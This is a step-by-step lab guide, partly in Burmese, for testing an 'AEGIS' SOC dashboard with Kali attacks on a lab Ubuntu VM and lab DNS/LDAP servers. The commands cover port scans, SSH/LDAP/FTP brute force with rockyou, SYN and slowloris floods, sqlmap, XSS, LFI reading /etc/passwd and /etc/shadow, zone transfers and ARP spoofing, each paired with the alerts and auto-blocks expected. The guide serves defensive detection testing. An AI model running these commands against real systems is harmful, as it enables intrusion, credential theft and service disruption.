# AEGIS — Attack Testing Guide (Step by Step)

> မှတ်တမ်း — ဒီ document က real lab မှာ attack test လုပ်ဖို့ step-by-step commands အားလုံးကို မှတ်တမ်းတင်ထားသည်။
> 
> **Setup:** Kali Linux (attacker) → Ubuntu VM (defender) → AEGIS Dashboard (monitor)

---

## Lab IP Reference

| Device | IP | Role |
|---|---|---|
| Kali Linux | `192.168.x.x` | Attacker |
| Ubuntu VM | `192.168.x.x` | Defender (Snort/Suricata/Fail2ban/Cowrie) |
| AEGIS Dashboard | https://aegis-soc-dashboard.vercel.app | Monitor only |
| AEGIS API | https://aegis-api-server-jp3b.onrender.com | Ingest + Commands |

> ⚠️ Ubuntu IP ကို `UBUNTU_IP` နဲ့ အစားထိုးပါ

---

## Pre-flight Checklist

```bash
# Ubuntu VM မှာ forwarder run ထားရမည်
sudo python3 /opt/aegis_forwarder.py --mode all
# → Dashboard Network Monitor မှာ Ubuntu ONLINE ဖြစ်ရမည်
# → Defense Center မှာ Fail2ban + Suricata ACTIVE ဖြစ်ရမည်

# Forwarder stop လုပ်ရင် → 45s အတွင်း OFFLINE အလိုအလျောက်ပြမည်
# Forwarder restart လုပ်ရင် → ချက်ချင်း ONLINE ပြမည်
```

---

## STEP 1 — Port Scan (Network Attack)

### Kali မှာ run

```bash
# Basic SYN scan
nmap -sS UBUNTU_IP

# Full port aggressive scan (Snort/Suricata က detect လုပ်မည်)
nmap -sS -sV -O -A -p 1-65535 UBUNTU_IP

# Stealth scan
nmap -sN UBUNTU_IP

# UDP scan
nmap -sU -p 53,69,123,161 UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `network / port_scan` event (severity: medium/high)
- **Command Center** → Attack volume chart တက်မည်
- **Network Monitor** → Kali IP ကို source event အဖြစ် မြင်ရမည်

### Auto-block trigger condition

- Suricata rule `ET SCAN` trigger ဖြစ်ရင် → auto-block (rule မှာ threshold သတ်မှတ်ထားသည်)

---

## STEP 2 — SSH Brute Force (Fail2ban Auto-block)

### Kali မှာ run

```bash
# hydra SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://UBUNTU_IP -t 4 -V

# medusa alternative
medusa -h UBUNTU_IP -u root -P /usr/share/wordlists/rockyou.txt -M ssh

# ncrack
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt UBUNTU_IP
```

### ဘာဖြစ်မည်

1. Ubuntu SSH auth.log မှာ failed login တွေ record ဖြစ်မည်
2. Fail2ban က threshold ကျော်ရင် (`maxretry=5` by default) ban လုပ်မည်
3. `aegis_forwarder.py` → `POST /api/ingest/fail2ban` ကို call လုပ်မည်
4. API server → **auto-block** Kali IP → `defense_commands` table မှာ iptables command queue ဖြစ်မည်
5. Dashboard → Defense Center → Active Blocks မှာ Kali IP ပေါ်မည်

### Dashboard မှာ မြင်ရမည်

- **Active Alerts** → CRITICAL/HIGH alert: "Fail2ban banned X.X.X.X"
- **Defense Center** → Kali IP blocked (AUTO badge)
- **Security Events** → `ssh / brute_force` events

---

## STEP 3 — DDoS / SYN Flood

### Kali မှာ run

```bash
# SYN flood (hping3)
sudo hping3 -S --flood -p 80 UBUNTU_IP

# ICMP flood
sudo hping3 --icmp --flood UBUNTU_IP

# UDP flood
sudo hping3 --udp --flood -p 53 UBUNTU_IP

# HTTP flood (slowloris)
pip3 install slowloris
python3 -m slowloris UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `network / ddos` or `network / syn_flood`
- **Command Center** → Attack volume spike
- **Active Alerts** → HIGH/CRITICAL alert ပေါ်မည်

---

## STEP 4 — Web Attacks (SQLi / XSS / LFI)

> Ubuntu မှာ DVWA သို့မဟုတ် vulnerable web app run ထားရမည်

### Kali မှာ run

```bash
# SQLi scan (sqlmap)
sqlmap -u "http://UBUNTU_IP/login?id=1" --batch --level=3 --risk=2

# SQLi with forms
sqlmap -u "http://UBUNTU_IP/login" --forms --batch --dbs

# XSS test (manual curl)
curl "http://UBUNTU_IP/search?q=<script>alert(1)</script>"

# Directory traversal / LFI
curl "http://UBUNTU_IP/page?file=../../../../etc/passwd"
curl "http://UBUNTU_IP/page?file=../../../etc/shadow"

# Directory brute force (gobuster)
gobuster dir -u http://UBUNTU_IP -w /usr/share/wordlists/dirb/common.txt -x php,html

# Nikto web scan
nikto -h http://UBUNTU_IP
```

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `web / sql_injection`, `web / xss`, `web / lfi`
- **Active Alerts** → HIGH alert ပေါ်မည်
- **Defense Center** → ModSecurity WAF auto-block (ModSecurity install ထားမှ)

---

## STEP 5 — Cowrie Honeypot (Immediate Auto-block)

> Ubuntu မှာ Cowrie run ထားရမည် (default port: 2222)

### Kali မှာ run

```bash
# Honeypot port ကို SSH connect လုပ်သည် (ချက်ချင်း auto-block trigger)
ssh root@UBUNTU_IP -p 2222

# Brute force on honeypot
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://UBUNTU_IP:2222
```

### ဘာဖြစ်မည်

- Cowrie က connection ကို fake shell ဖြင့် log လုပ်မည်
- `aegis_forwarder.py` → `POST /api/ingest/cowrie` call
- API server → **ချက်ချင်း auto-block** Kali IP (threshold=1, honeypot = immediate)
- Dashboard → Active Alerts မှာ CRITICAL alert

---

## STEP 6 — DNS Attack (company-dns-server)

### ⚠️ VM Pre-requisite: BIND9 Query Logging ဖွင့်ရမည်

BIND9 default အနေဖြင့် query log မထုတ်ဘူး — ဒီ config မပေးဘဲ forwarder က ဘာမှ detect မလုပ်နိုင်ဘူး။

**company-dns-server မှာ run ရမည်:**
```bash
# 1. Log directory create
sudo mkdir -p /var/log/named
sudo chown bind:bind /var/log/named
sudo chmod 755 /var/log/named

# 2. named.conf.local မှာ logging section ထည့်
sudo tee -a /etc/bind/named.conf.local <<'EOF'

logging {
    channel queries_log {
        file "/var/log/named/named.log" versions 3 size 10m;
        severity dynamic;
        print-time yes;
        print-severity yes;
        print-category yes;
    };
    category queries { queries_log; };
    category default { queries_log; };
};
EOF

# 3. BIND9 restart
sudo systemctl restart bind9

# 4. စစ်ဆေး — log file ဖြစ်နေမှာ
sudo tail -f /var/log/named/named.log
```

> AppArmor profile issue ဖြစ်ရင်:
> `sudo nano /etc/apparmor.d/usr.sbin.named` → `/var/log/named/** rw,` ထည့် → `sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.named`

---

### Kali မှာ run

```bash
# DNS Zone Transfer (AXFR) — HIGH severity alert
dig AXFR company.local @DNS_SERVER_IP
dig AXFR @DNS_SERVER_IP company.local

# DNS enumeration (dnsenum)
dnsenum --dnsserver DNS_SERVER_IP company.local

# DNS brute force (dnsrecon) — 30+ queries in 60s → flood detect
dnsrecon -d company.local -n DNS_SERVER_IP -t brt

# Fierce DNS recon
fierce --domain company.local --dns-servers DNS_SERVER_IP

# Manual refused query flood
for i in $(seq 1 10); do dig @DNS_SERVER_IP nonexistent$i.company.local; done
```

> `DNS_SERVER_IP` = `10.10.10.20` (company-dns-server)

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `dns_attack / dns_zone_transfer` (HIGH) — AXFR
- **Security Events** → `dns_attack / dns_query_refused` (MEDIUM) — enum/flood
- **Connection Logs → DNS tab** → DNS attack records

### Forwarder detect conditions

| Attack | Trigger |
|---|---|
| Zone transfer | AXFR/IXFR keyword in log line |
| DNS recon | ≥5 denied/refused queries from same IP in 60s |
| DNS flood/enum | ≥30 total queries from same IP in 60s |

---

## STEP 7 — LDAP Attack (company-ldap-server)

### ⚠️ VM Pre-requisite: slapd Logging ဖွင့်ရမည်

OpenLDAP default loglevel=0 — connection/auth events log မထွက်ဘူး။

**company-ldap-server မှာ run ရမည်:**
```bash
# Option A — cn=config (modern Ubuntu, recommended)
sudo ldapmodify -Y EXTERNAL -H ldapi:/// <<'EOF'
dn: cn=config
changetype: modify
replace: olcLogLevel
olcLogLevel: 256
EOF
# loglevel 256 = connections; 1 = trace; 256+1 = connections+auth details

# Option B — slapd.conf (older setups)
# /etc/ldap/slapd.conf မှာ: loglevel 256

# syslog ကို စစ်ဆေး — slapd connection entries ပေါ်ရမည်
sudo tail -f /var/log/syslog | grep slapd

# ပေါ်မလာရင် rsyslog config စစ်
sudo systemctl restart rsyslog slapd
```

**ပေါ်မလာသေးရင် alternative log path:**
```bash
# journald မှ syslog ကို forward လုပ်ရမည်
echo "ForwardToSyslog=yes" | sudo tee -a /etc/systemd/journald.conf
sudo systemctl restart systemd-journald rsyslog
```

---

### Kali မှာ run

```bash
# LDAP brute force (hydra) — err=49 trigger
hydra -l "cn=admin,dc=company,dc=local" -P /usr/share/wordlists/rockyou.txt \
  ldap2://LDAP_SERVER_IP

# ldapsearch with wrong password (manual test)
ldapsearch -H ldap://LDAP_SERVER_IP -x -D "cn=admin,dc=company,dc=local" \
  -w wrongpassword -b "dc=company,dc=local"

# DN enumeration — err=32 trigger (nonexistent DN)
ldapsearch -H ldap://LDAP_SERVER_IP -x -D "cn=fake,dc=company,dc=local" \
  -w anypassword -b "dc=company,dc=local"

# nmap LDAP script
nmap -sV -p 389 --script ldap-brute,ldap-search LDAP_SERVER_IP
```

> `LDAP_SERVER_IP` = `10.20.20.20` (company-ldap-server)

### Dashboard မှာ မြင်ရမည်

- **Security Events** → `ldap_attack / LDAP Auth Brute Force` (HIGH)
- **Security Events** → `ldap_attack / LDAP Enum` (HIGH) — DN enumeration
- **Connection Logs → LDAP tab** → LDAP attack records

### Forwarder detect conditions

| slapd error | Attack type | Severity |
|---|---|---|
| err=49 / "Invalid credentials" | Auth Brute | HIGH |
| err=32 / "No such object" | Enum | HIGH |

---

## STEP 8 — FTP Attack

```bash
# FTP brute force
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://UBUNTU_IP

# FTP banner grab
nmap -sV -p 21 UBUNTU_IP

# FTP login attempt
ftp UBUNTU_IP
```

---

## STEP 9 — ARP Spoofing / MITM

```bash
# ARP spoofing (Kali မှာ)
sudo arpspoof -i eth0 -t UBUNTU_IP GATEWAY_IP

# Or with ettercap
sudo ettercap -T -M arp:remote /UBUNTU_IP// /GATEWAY_IP//
```

---

## STEP 10 — Encrypted Traffic Anomaly (TLS)

```bash
# Weak cipher test (openssl)
openssl s_client -connect UBUNTU_IP:443 -cipher NULL-MD5

# SSL scan
sslscan UBUNTU_IP:443

# testssl
testssl.sh UBUNTU_IP:443
```

---

## After Each Attack — Unblock Commands

### Option A: Dashboard မှ unblock (Recommended)
```
Defense Center → Active Blocks → Kali IP → "Unblock" button နှိပ်
```

### Option B: API မှ unblock
```bash
curl -X DELETE https://aegis-api-server-jp3b.onrender.com/api/defense/block/KALI_IP \
  -H "X-AEGIS-Admin-Key: YOUR_ADMIN_KEY"
```

### Option C: Ubuntu VM မှာ iptables ကိုယ်တိုင် ဖြုတ်
```bash
# Rule စစ်ဆေးသည်
sudo iptables -L INPUT -n --line-numbers | grep KALI_IP

# Rule ဖြုတ်သည်
sudo iptables -D INPUT -s KALI_IP -j DROP
sudo iptables -D OUTPUT -d KALI_IP -j DROP
sudo iptables -D FORWARD -s KALI_IP -j DROP

# Fail2ban ban ဖြုတ်သည်
sudo fail2ban-client set sshd unbanip KALI_IP

# Confirm — output မထွက်ရင် unblocked ပြီ
sudo iptables -L INPUT -n | grep KALI_IP
```

---

## Manual Ingest Test (VM မလိုဘဲ simulate)

```bash
# Fail2ban ban simulate → auto-block trigger
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/fail2ban \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"ip":"10.10.10.99","service":"sshd","action":"ban","timestamp":"2026-07-02T12:00:00Z"}'

# Port scan event simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/snort \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","dst_ip":"192.168.1.10","alert":"ET SCAN Nmap","severity":"medium","timestamp":"2026-07-02T12:00:00Z"}'

# SSH brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ssh \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","username":"root","auth_method":"password","success":false,"timestamp":"2026-07-02T12:00:00Z"}'

# Cowrie honeypot simulate → immediate auto-block
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/cowrie \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"eventid":"cowrie.login.failed","src_ip":"10.10.10.99","username":"root","password":"123456","timestamp":"2026-07-02T12:00:00Z"}'

# Web attack simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/http \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","attack_type":"sql_injection","uri":"/login?id=1 OR 1=1--","method":"GET","status_code":403,"timestamp":"2026-07-02T12:00:00Z"}'

# DDoS simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"10.10.10.99","dest_ip":"192.168.1.10","alert":{"signature":"ET DOS","severity":1},"proto":"TCP","event_type":"alert","timestamp":"2026-07-02T12:00:00Z"}'
```

---

## Real-time Monitoring Flow

```
Script run    → Ubuntu ONLINE (15s heartbeat)
Script stop   → Ubuntu OFFLINE (45s auto-timeout OR instant via SIGINT)
fail2ban      → Fail2ban ACTIVE in Defense Center
suricata      → Suricata ACTIVE in Defense Center
Attack starts → Security Events feed (SSE real-time)
Threshold hit → Auto-block → Defense Center blocks + Alert fires
Unblock       → Dashboard button OR curl DELETE OR iptables -D
```

---

## Dashboard Pages Quick Reference

| Page | ဘာကြည့်ရမည် |
|---|---|
| **Command Center** | Attack volume chart, recent telemetry |
| **Security Events** | Filter by source/type/severity |
| **Active Alerts** | Critical/High alerts — acknowledge လုပ်ရမည် |
| **Network Monitor** | Kali/Ubuntu online/offline status real-time |
| **Defense Center** | Fail2ban/Suricata status, active blocks, action log |
| **System Status** | All sensor health (Suricata/Snort/Fail2ban/Cowrie/WAF) |

---

*Last updated: 2026-07-02 | AEGIS SOC Dashboard — Attack Testing Reference*
